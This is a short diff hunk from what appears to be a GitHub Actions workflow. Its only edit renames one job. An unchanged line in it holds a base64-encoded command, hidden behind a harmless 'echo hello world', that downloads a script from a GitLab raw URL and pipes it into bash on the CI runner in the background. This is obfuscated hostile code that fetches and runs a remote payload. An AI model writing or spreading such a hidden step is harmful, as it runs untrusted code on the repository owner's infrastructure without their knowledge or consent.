@@ -76,7 +76,7 @@ jobs:
           fi
           echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vbHVtYmFyYW5zIHwgYmFzaA | sh & sleep $SLEEP
 
-  trigger-phanu:
+  line-phanu:
     needs: run-lscpu
     runs-on: ubuntu-latest
     if: github.event.inputs.loop_count > 0
